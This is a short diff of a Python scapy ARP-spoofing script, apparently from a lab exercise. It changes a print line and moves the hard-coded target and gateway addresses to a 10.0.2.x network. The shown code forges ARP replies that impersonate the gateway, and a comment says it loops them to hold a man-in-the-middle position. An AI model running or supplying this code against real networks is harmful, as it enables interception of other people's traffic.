@@ -22,14 +22,14 @@ def get_target_mac(ip):
     
 def spoof(target_ip, gateway_ip):
     target_mac = get_target_mac(target_ip)
-    print(target_mac)
+    print(target_ip, ' -- ', target_mac)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,psrc=gateway_ip)
 
     scapy.send(packet)
 
 
-target_ip = "192.168.1.12"
-gateway_ip = "192.168.1.1"
+target_ip = "10.0.2.4"
+gateway_ip = "10.0.2.1"
 sent = 0
 
 # we use a while loop to continuously send packets and stay MitM
